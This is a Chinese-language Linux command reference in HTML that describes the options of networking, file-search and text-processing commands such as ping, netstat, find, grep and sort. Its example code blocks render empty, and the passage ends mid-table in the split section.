<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> ping</h3>
<p><code>ping</code> 用于测试主机之间的网络连通性。语法格式：<code>ping [选项] 主机地址</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">总共发送次数</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">极限检测，快速连续 ping 一台主机，ping 的速度达到 100 次每秒</td>
</tr>
<tr>
<td style="text-align:center"><code>-I</code></td>
<td style="text-align:left">指定网卡名称</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">每次间隔时间（秒）</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">不要将 IP 地址转换成主机名</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">指定每次 ping 发送的数据字节数，默认为 “56 字节” + “28 字节” 的 ICMP 头，一共是 84 字节；包头 + 内容不能大于 65535，所以最大值为 65507（linux:65507, windows:65500）</td>
</tr>
<tr>
<td style="text-align:center"><code>-W</code></td>
<td style="text-align:left">最长等待时间（秒）</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> tracepath</h3>
<p><code>tracepath</code> 用于显示数据包达到主机途中所经过的路由信息。语法格式：<code>tracepath [选项] 域名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">主要以数字形式打印 IP 地址</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">打印主机名和 IP 地址</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">将 tracepath 的初始数据包长度设置为 pktlen，而不是 65535 或 tracepath6 的 128000</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">将最大跃点（或最大 TTL）设置为 max_hops，而不是 30</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">设置要使用的初始目标端口</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> netstat</h3>
<p><code>netstat</code> 用于显示网络连接、路由表、接口状态等网络相关信息。语法格式：<code>netstat [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有连接中的 Socket</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">显示正在使用的 Socket 信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">显示 TCP 协议的连接信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">显示 UDP 协议的连接信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">使用 IP 地址，不使用域名</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">仅列出正在监听的服务状态</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">现在网卡列表信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">显示路由表信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>State 链接状态：</p>
<ul>
<li><strong>ESTABLISHED</strong>：指 TCP 连接已建立，双方可以进行方向数据传递</li>
<li><strong>CLOSE_WAIT</strong>：表示在等待关闭</li>
<li><strong>LISTENING</strong>：指 TCP 正在监听端口，可以接受链接</li>
<li><strong>TIME_WAIT</strong>：指连接已准备关闭</li>
<li><strong>FIN_WAIT_1</strong>：表示等待对方的 FIN 报文。SOCKET 在 ESTABLISHED 状态时，它想主动关闭连接，向对方发送了FIN 报文</li>
<li><strong>FIN_WAIT_2</strong>：表示等待对方的 FIN 报文。SOCKET 在 ESTABLISHED 状态时，它想主动关闭连接，向对方发送了FIN 报文，并对方回应 ACK 报文后</li>
<li><strong>LAST_ACK</strong>：是被动关闭一方在发送 FIN 报文后，最后等待对方的 ACK 报文</li>
<li><strong>SYNC_RECEIVED</strong>：收到对方的连接建立请求</li>
<li><strong>SYNC_SEND</strong>：已经主动发出连接建立请求</li>
</ul>
<h3> history</h3>
<p><code>history</code> 用于显示执行过的命令历史。语法格式：<code>history [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">清空当前用户在本机上执行的 Linux 命令历史记录信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">显示历史记录中最近的 N 个记录，例如 history 5</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> sosreport</h3>
<p><code>sosreport</code> 用于收集系统配置及架构信息并输出诊断文档，收集好的资料压缩文件以及校验码，在输出内容的最下面显示。语法格式：<code>sosreport [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">列出所有可用的插件及其选项</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">禁用指定的插件</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">启用指定的插件</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">对于所有的插件启用，将所有布尔选项设置为 True</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">增加日志记录的详细程度</td>
</tr>
<tr>
<td style="text-align:center"><code>--no-report</code></td>
<td style="text-align:left">禁用 HTML 报告写入</td>
</tr>
<tr>
<td style="text-align:center"><code>--config-file</code></td>
<td style="text-align:left">CONFIG 指定备用配置文件</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> watch</h3>
<p><code>watch</code> 命令会按照指定的间隔时间来执行命令并显示其输出，命令默认每 2 秒更新一次输出。语法格式：<code>watch [选项] 命令</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">指定更新输出的时间间隔</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">重标记出连续的命令输出之间的差异</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2> 查找定位文件命令</h2>
<h3> pwd</h3>
<p><code>pwd</code> 用于显示用户当前所处的工作目录</p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> cd</h3>
<p><code>cd</code> 用于切换当前的工作路径。语法格式：<code>cd [选项] [目录]</code></p>
<ul>
<li><strong>cd -</strong>：返回到上一次所处的目录</li>
<li><strong>cd ../</strong>：进入当前目录的上一级目录</li>
<li><strong>cd ./</strong>：当前目录</li>
<li><strong>cd ~</strong>：返回到当前用户的家目录</li>
</ul>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> ls</h3>
<p><code>ls</code> 用于显示目录中文件信息。语法格式：<code>ls [选项] [文件名称]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">查看目录下的所有文件，包括隐藏文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">查看文件属性、大小等详细信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">对文件反向排序</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">对文件以时间排序</td>
</tr>
<tr>
<td style="text-align:center"><code>-Z</code></td>
<td style="text-align:left">查看文件的安全上下文值</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> tree</h3>
<p><code>tree</code> 用于以树状图的形式列出目录内容及结构。语法格式：<code>tree [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">打印所有文件,包括隐藏文件、目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-C</code></td>
<td style="text-align:left">在文件和目录清单上加上色彩，便于区分文件类型</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">仅列出目录名称，而非内容</td>
</tr>
<tr>
<td style="text-align:center"><code>-D</code></td>
<td style="text-align:left">列出文件或目录更改时间</td>
</tr>
<tr>
<td style="text-align:center"><code>-L</code></td>
<td style="text-align:left">目录树的最大显示深度</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">打印结构同时打印文件权限</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">跟随目录的符号链接，就像它们是目录一样。 避免了导致递归循环的链接</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">打印每个文件的完整路径前缀</td>
</tr>
<tr>
<td style="text-align:center"><code>-F</code></td>
<td style="text-align:left">在每个条目后加上文件类型的指示符（如目录是 <code>/</code>）</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> find</h3>
<p><code>find</code> 用于按照指定条件来查找文件所对应的位置。语法格式：<code>find [查找范围] [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-name</code></td>
<td style="text-align:left">匹配名称</td>
</tr>
<tr>
<td style="text-align:center"><code>-perm</code></td>
<td style="text-align:left">匹配权限（mode 为完全匹配，-mode 为包含即可）</td>
</tr>
<tr>
<td style="text-align:center"><code>-user</code></td>
<td style="text-align:left">匹配所有者</td>
</tr>
<tr>
<td style="text-align:center"><code>-group</code></td>
<td style="text-align:left">匹配所有组</td>
</tr>
<tr>
<td style="text-align:center"><code>-mtime -n +n</code></td>
<td style="text-align:left">匹配修改内容的时间（-n 指 n 天以内，+n 指 n 天以前）</td>
</tr>
<tr>
<td style="text-align:center"><code>-atime -n +n</code></td>
<td style="text-align:left">匹配访问文件的时间（-n 指 n 天以内，+n 指 n 天以前）</td>
</tr>
<tr>
<td style="text-align:center"><code>-ctime -n +n</code></td>
<td style="text-align:left">匹配修改文件权限的时间（-n 指 n 天以内，+n 指 n 天以前）</td>
</tr>
<tr>
<td style="text-align:center"><code>-nouser</code></td>
<td style="text-align:left">匹配无所有者的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-nogroup</code></td>
<td style="text-align:left">匹配无所有组的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-newer f1 !f2</code></td>
<td style="text-align:left">匹配比文件 f1 新但比 f2 旧的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>--type b/d/c/p/l/f</code></td>
<td style="text-align:left">匹配文件类型（后面的字幕字母依次表示块设备、目录、字符设备、管道、链接文件、文本文件）</td>
</tr>
<tr>
<td style="text-align:center"><code>-size</code></td>
<td style="text-align:left">匹配文件的大小（+50KB 为查找超过 50KB 的文件，而 -50KB 为查找小于 50KB 的文件）</td>
</tr>
<tr>
<td style="text-align:center"><code>-prune</code></td>
<td style="text-align:left">忽略某个目录</td>
</tr>
<tr>
<td style="text-align:center"><code>-exec .....{}\;</code></td>
<td style="text-align:left">后面可跟用于进一步处理搜索结构的命令</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> locate</h3>
<p><code>locate</code> 用于按照名称快速搜索文件所对应的位置。语法格式：<code>locate 文件名称</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>find 命令进行全盘搜索虽然更准确，但是效率有点低，如果仅仅是想找一些常见的、又知道大概名称的文件，不如试试 locate 命令</p>
<p>locate 命令是将一些常用的目录作成一个索引库文件，一般叫做 <code>/var/lib/mlocate/mlocate.db</code>，后续再搜索文件的时候就是根据这个数据库中所包含的路径查找，速度会快很多</p>
<p>第一次使用 locate 命令前，先执行 updatedb 命令来生成索引数据库，然后再进行查找</p>
</div>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> whereis</h3>
<p><code>whereis</code> 用于按照名称快速搜索二进制程序（命令）、源代码以及帮助手册文件所对应的位置。语法格式：<code>whereis 命令名称</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> which</h3>
<p><code>which</code> 用于按照名称快速搜索二进制程序（命令）所对应的位置。语法格式：<code>which 命令名称</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> cat</h3>
<p><code>cat</code> 用于查看纯文本文件（内容较少的）。语法格式：<code>cat [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">显示行号</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">显示行号，空白行不显示行号</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">当遇到有连续两行或两行以上的空白行，就代换为一行的空白行</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">在输出内容的每一行后面加一个 <code>$</code> 符号。（包括空白行）</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> more</h3>
<p><code>more</code> 用于查看纯文本文件（内容较多的）。语法格式：<code>more [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>+&lt;number&gt;</strong></td>
<td style="text-align:left">从第 n 行开始显示</td>
</tr>
<tr>
<td style="text-align:center"><strong>-&lt;number&gt;</strong></td>
<td style="text-align:left">定义屏幕大小为 n 行</td>
</tr>
<tr>
<td style="text-align:center"><strong>+/pattern</strong></td>
<td style="text-align:left">在每个档案显示前搜寻该字串（pattern），然后从该字串前两行之后开始显示</td>
</tr>
<tr>
<td style="text-align:center"><strong>-c</strong></td>
<td style="text-align:left">从顶部清屏，然后显示</td>
</tr>
<tr>
<td style="text-align:center"><strong>-d</strong></td>
<td style="text-align:left">提示 “Press space to continue，’q’ to quit（按空格键继续，按 q 键退出）”，禁用响铃功能</td>
</tr>
<tr>
<td style="text-align:center"><strong>-l</strong></td>
<td style="text-align:left">忽略 <code>Ctrl+l</code>（换页）字符</td>
</tr>
<tr>
<td style="text-align:center"><strong>-p</strong></td>
<td style="text-align:left">通过清除窗口而不是滚屏来对文件进行换页，与 -c 选项相似</td>
</tr>
<tr>
<td style="text-align:center"><strong>-s</strong></td>
<td style="text-align:left">把连续的多个空行显示为一行</td>
</tr>
<tr>
<td style="text-align:center"><strong>-u</strong></td>
<td style="text-align:left">把文件内容中的下画线去掉</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> head</h3>
<p><code>head</code> 用于查看纯文本文件的前 N 行。语法格式：<code>head [选项] 文件名称</code></p>
<blockquote>
<p>默认查看文本文件的前 10 行</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">指定前 N 行</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">输出文件前面的 K 个字节</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> tail</h3>
<p><code>tail</code> 用于查看纯文本文件的后 N 行或持续刷新文件的最新内容。语法格式：<code>tail [选项] 文件名称</code></p>
<blockquote>
<p>默认查看文本文件的后 10 行</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-n</td>
<td style="text-align:left">指定后 N 行</td>
</tr>
<tr>
<td style="text-align:center">-c</td>
<td style="text-align:left">输出文件最后的 K 个字节</td>
</tr>
<tr>
<td style="text-align:center">-f</td>
<td style="text-align:left">持续刷新文件内容</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> tr</h3>
<p><code>tr</code> 用于替换文本内容中的字符。语法格式：<code>tr [原始字符] [目标字符]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">删除指定字符串</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">删除所有重复出现字符序列，只保留一个；即将重复出现字符串压缩为一个字符串</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> wc</h3>
<p><code>wc</code> 用于统计指定文本文件的行数、字数或字节数。语法格式：<code>wc [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">只显示行数</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code></td>
<td style="text-align:left">只显示单词数</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">只显示字节数</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> stat</h3>
<p><code>stat</code> 用于查看文件的具体存储细节和时间等信息。语法格式：<code>stat 文件名称</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> grep</h3>
<p><code>grep</code> 用于按行提取文本内容。语法格式：<code>grep [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">将可执行文件（binary）当作文本文件（text）来搜索</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">仅显示找到的行数</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">忽略大小写</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">显示行号</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">取反</td>
</tr>
<tr>
<td style="text-align:center"><code>-E</code></td>
<td style="text-align:left">扩展 grep</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> cut</h3>
<p><code>cut</code> 用于案列提取文本内容。语法格式：<code>cut [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">以字节为单位进行分割</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">以字符为单位进行分割</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">自定义分隔符，默认为制表符</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">设置需要查看的列数</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> diff</h3>
<p><code>diff</code> 用于比较多个文件之间内容的差异。语法格式：<code>diff [选项] 文件名称A 文件名称B</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">diff 只会逐行比较文本文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">不检查空格字符的不同</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">描述文件内容具体的不同</td>
</tr>
<tr>
<td style="text-align:center"><code>-H</code></td>
<td style="text-align:left">比较大文件时，可加快速度</td>
</tr>
</tbody>
</table>
<p><code>diff</code> 命令的显示结果有以下两种方式：</p>
<ul>
<li><strong>&lt;</strong>：表示第一个文件中的数据行</li>
<li><strong>&gt;</strong>：表示第二个文件中的数据行</li>
</ul>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> uniq</h3>
<p><code>uniq</code> 用于去除文本中连续重复的行。语法格式：<code>uniq [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-c</code> 或 <code>--count</code></td>
<td style="text-align:left">打印每行出现的次数</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code> 或 <code>--repeated</code></td>
<td style="text-align:left">只打印重复出现的行</td>
</tr>
<tr>
<td style="text-align:center"><code>-D</code></td>
<td style="text-align:left">打印所有重复行</td>
</tr>
<tr>
<td style="text-align:center"><code>--all-repeated[=METHOD]</code></td>
<td style="text-align:left">类似 <code>-D</code>，使用空行分隔每个组，<code>METHOD=none,prepend,separate</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code> 或 <code>--skip-fields=N</code></td>
<td style="text-align:left">不比较前 N 个字段</td>
</tr>
<tr>
<td style="text-align:center"><code>--group[=METHOD]</code></td>
<td style="text-align:left">使用空行分隔每个组，<code>METHOD=separate,prepend,append,both</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code> 或 <code>--ignore-case</code></td>
<td style="text-align:left">忽略大小写</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code> 或 <code>--skip-chars=N</code></td>
<td style="text-align:left">不比较前 N 个字符</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code> 或 <code>--unique</code></td>
<td style="text-align:left">只打印出现一次的行</td>
</tr>
<tr>
<td style="text-align:center"><code>-z</code> 或 <code>--zero-terminated</code></td>
<td style="text-align:left">行分隔符是 NUL 而不是换行符</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code> 或 <code>--check-chars=N</code></td>
<td style="text-align:left">比较不多于 N 个字符</td>
</tr>
<tr>
<td style="text-align:center"><code>--help</code></td>
<td style="text-align:left">帮助文档</td>
</tr>
<tr>
<td style="text-align:center"><code>--version</code></td>
<td style="text-align:left">版本信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> sort</h3>
<p><code>sort</code> 用于对文本内容进行排序，默认为正序排序。语法格式：<code>sort [选项] 文件名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">忽略大小写</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">忽略缩进与空格</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">以数值型排序</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">反向排序</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">去除重复行</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">指定间隔符</td>
</tr>
<tr>
<td style="text-align:center"><code>-k</code></td>
<td style="text-align:left">设置字段范围</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> split</h3>
<p><code>split</code> 用于将一个文件分割成数个。语法格式：<code>split [选项] 文件名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">生成长度为 N 的后缀（默认值为 2）</td>
</tr>
<tr>
<td style="text-align:center"><code>--additional-suffix=SUFFIX</code></td>
<td style="text-align:left">将附加后缀添加到分割后的文件名</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">为每个输出文件输入 SIZE 字节</td>
</tr>
<tr>
<td style="text-align:center"><code>-C</code></td>
<td style="text-align:left">每个输出文件最多放置行的大小字节</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">使用从 0 开始的数字后缀，而不是字母后缀</td>
</tr>
<tr>
<td style="text-align:center"><code>--numeric-suffixes[=FROM]</code></td>
